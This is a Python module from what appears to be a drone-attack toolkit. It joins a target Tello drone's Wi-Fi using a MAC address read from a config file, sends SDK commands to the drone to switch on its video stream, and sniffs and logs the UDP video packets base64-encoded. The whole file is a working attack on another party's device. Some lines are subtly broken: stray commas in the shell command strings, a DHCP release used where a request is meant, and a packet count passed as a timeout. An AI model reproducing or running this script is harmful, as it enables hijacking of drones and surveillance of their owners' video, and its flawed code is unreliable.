import os
import json
import time
import base64
import socket
import threading
import subprocess
from src.utils import sudo_exec
from scapy.all import sniff, Raw

##################
### PREP MODULE ##
##################

class VideoSniffer:
    def __init__(self):

        # Get path to project root directory (two levels up from this file)
        target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
        scan_info = None

        # Intialize target drone data
        with open(target_data_file, 'r') as file:
            scan_info = json.load(file)

        target_info = scan_info.get("target_info", {})
        self.target_mac = target_info.get("mac_address")
        self.target_channel = target_info.get("channel")

        options_info = scan_info.get("options", {})
        self.packets = options_info.get("packets")
        self.interface = options_info.get("interface")

        self.output_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "sniff_output.log")
        with open(self.output_data_file, 'w') as f:
            f.write("")

        protocol = "udp" # UDP/TCP
        direction = "port" # Sniffing packets outgoing FROM the port
        self.port = 11111 # Port to sniff

        self.bpf_filter = f"{protocol} {direction} {self.port}"

    def wifi_connect(self):
        """
        Connects to the drone's wifi network.
        """
        
        # Connecting to drone's WiFi via nmcli
        wifi = sudo_exec(f"nmcli dev wifi connect {self.target_mac} ifname {self.interface}")
        # cmd = ["nmcli", "dev", "wifi", "connect", self.target_mac, "ifname", self.interface]

        # wifi = subprocess.run(cmd, capture_output=True, text=True)

        if wifi.returncode == 0:
            print(f"Successfully connected to {self.target_mac}")
            return True
        else:
            print(f"Error: nmcli failed: {wifi.stderr.strip()}")
            
            # Connect manually by associating with ESSID
            sudo_exec(f"iwconfig {self.interface}, essid {self.target_mac}")
            time.sleep(2)

            # Request IP via DHCP
            result = sudo_exec(f"dhclient, -r {self.interface}")

            if result.returncode == 0:
                print("DHCP success.")
                return True
            else:
                print("DHCP failed.")
                return False


    def wait_for_ip(self):
        """
        Waits until we get a valid IP address on the network
        """
        # Wait for IP assignment
        start_time = time.time()
        timeout = 10
        
        while time.time() - start_time < timeout:
            try:
                output = subprocess.check_output(["ifconfig", self.interface], text=True)
                if "inet" in output:
                    print("IP Address acquired.")
                    return True
            except:
                pass
            time.sleep(0.5)
        print("Failed to acquire IP address (DHCP timeout)")
        return False

    def activate_tello(self):
        """
        Awakens TELLO video feed by sending a message to the cmd port.
        """

        # Using default IP and port for commands
        tello_ip = '192.168.10.1'
        tello_port = 8889

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        
        try:
            # Enter SDK mode
            sock.sendto(b'command', (tello_ip, tello_port))

            # Enable video stream
            sock.sendto(b'streamon', (tello_ip, tello_port))
            print("Activation commands sent.")

        except Exception:
            print("Error: Could not send activation commands.")

        while True:
            try:
                sock.sendto(b'command', (tello_ip, tello_port))
                time.sleep(3)
            except Exception:
                break
        
        sock.close()
    
        
    def packet_handler(self, packet):
        """
        Extracts raw payload, base64 encodes it, and writes to file.
        """

        if packet.haslayer(Raw):
            try:
                # Extract binary
                raw_data = packet[Raw].load

                b64_data = base64.b64encode(raw_data).decode('utf-8')

                log_entry = f"{b64_data}\n"

                with open(self.output_data_file, 'a') as f:
                    f.write(log_entry)
                    f.flush()

                print(f"Captured {len(raw_data)} bytes from {self.target_mac}.")
            except Exception as e:
                print(f"Error processing packet: {e}")

##################
## START MODULE ##
##################

Sniffer = VideoSniffer()

print(f"Started sniffing with filter: {Sniffer.bpf_filter}\n")

if Sniffer.wifi_connect():
    Sniffer.wait_for_ip()

threading.Thread(target=Sniffer.activate_tello, daemon=True).start()

try:
    sniff(iface=Sniffer.interface,
          filter=Sniffer.bpf_filter,
          prn=Sniffer.packet_handler,
          timeout=Sniffer.packets,
          store=0 # Causes RAM issues if you store
        )
    print("Sniffing complete.\n")
except Exception as e:
    print(f"Sniffer crashed: {e}")

